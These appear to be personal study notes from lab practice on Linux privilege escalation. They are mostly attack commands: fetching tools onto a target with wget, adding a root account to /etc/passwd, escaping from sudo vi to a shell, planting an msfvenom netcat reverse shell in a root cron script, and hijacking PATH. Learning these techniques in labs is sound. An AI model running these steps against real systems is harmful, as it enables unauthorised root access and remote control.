# Privilage Escalation
- Horizontal Escalation vs Vertical Escalation

#### Uploading a file to the target computer
- There are two ways to get LinEnum on the target machine. The first way, is to go to the directory that you have your local copy of LinEnum stored in, and start a Python web server using **python3 -m http.server 8000** [1]. Then using **wget** on the target machine, and your local IP, you can grab the file from your local machine [2]. Then make the file executable using the command **chmod +x FILENAME.sh**
  - python3 -m http.server 8000 - local machine
    - This starts the listener
  - wget {LOCAL MACHINE IP ADDRESS}:{PORT}/FILENAME.sh - target machine
  - chmode +x FILENAME.sh

- If transferring the file fails
  - copy the file script to a Vi or Nano - save the file with an .sh file extention
  -chmod +x FILENAME.sh

#### Running the script
- travel to the folder containing the file
- ./FILENAME.sh

### Finding SUID/GUID capable files manually
- find / -perm -u=s -type f 2>/dev/null

### Creating a hash password
- openssl passwd -1 -salt [salt] [password]
- adding a new user from an ecalated account
  - FORMAT: username:passwordhash:0:0:root:/root:/bin/bash
  - EXAMPLE(new:123(salted w/'new')): new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
### Modifying the /etc/password file
- use vi /etc/passwd
  - this required looking at a cheetsheet - as vi is not intuitive to use

## Checking privlidges
- everytime you own the box and get root or sper user access run the follwoing to check command access
  - sudo -l
- this can be run to determine what access you have once you gain a foothold
  - sudo vi
    - this opens vi as root
  - :!sh
    - opens a shell in vi

### Explpoiting Crontab
- See all running cron jobs on the machine 
  - cat /etc/crontab
- In this example we had a system process running a script with root user acces every 5 minutes, I created a payload with msfvenom for a reverse shell and tranfered it over to the target machine - and then set up a listener on my own until the allotted time went by and then it autoconnected my reverse shell
- Commands
  - msfvenom -p cmd/unix/reverse_netcat lhost={Local IP} lport=8888 R > myFile.exe
  - set up local server
    - pyhton3 -m http.server 8000 (local)
    - wget {IP}:{port}/filename
  - echo myFile.exe > autoscript.sh
  - nc -lvnp 8888
  - after 5 minutes I recieved a ping - and my shell connected at root

### Path Variables
To check the path to your location
  - echo $PATH
- We can set up a fake file somewhere and then change the route that we want the user to go when they execute a command - in this example a 'script' file is executing the 'ls' comand everytime it is ran
- set up a imitation executable (/tmp) folder is a good locaiton
  - echo '[whatever the command we want to run is]' > [name of the executable we are imitating]
    - EXAMPLE: echo '/bin/bash' > ls
    - set file to executable
      - chmod +x ls
    - change path to the tmp file when to original file is executed *MAke sure to make a note of the original path location to clean up when you are through
      - export PATH=/tmp:$PATH


